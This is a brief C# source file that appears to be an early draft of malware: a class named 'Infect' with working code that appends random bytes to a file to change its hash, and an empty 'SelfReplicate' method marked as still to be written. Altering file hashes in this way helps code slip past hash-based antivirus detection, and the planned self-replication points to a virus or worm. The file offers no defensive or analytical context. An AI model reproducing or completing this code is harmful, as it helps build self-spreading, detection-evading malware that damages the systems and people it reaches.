using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ezikbucur
{
    internal static class Infect
    {
        private static byte[] AppendArbitraryData(byte[] inData)
        {
            Random r = new();
            byte[] arbitraryData = new byte[32];
            r.NextBytes(arbitraryData);

            byte[] buff = new byte[inData.Length +  arbitraryData.Length];
            Buffer.BlockCopy(inData, 0, buff, 0, inData.Length);
            Buffer.BlockCopy(arbitraryData, 0, buff, inData.Length, arbitraryData.Length);

            return buff;
        }

        private static void ChangeFileHash(string filePath)
        {
            byte[] fileBytes = File.ReadAllBytes(filePath);
            byte[] newBytes = AppendArbitraryData(fileBytes);
            File.WriteAllBytes(filePath, newBytes);
        }

        private static void SelfReplicate() { } //TODO: do this shit
    }
}
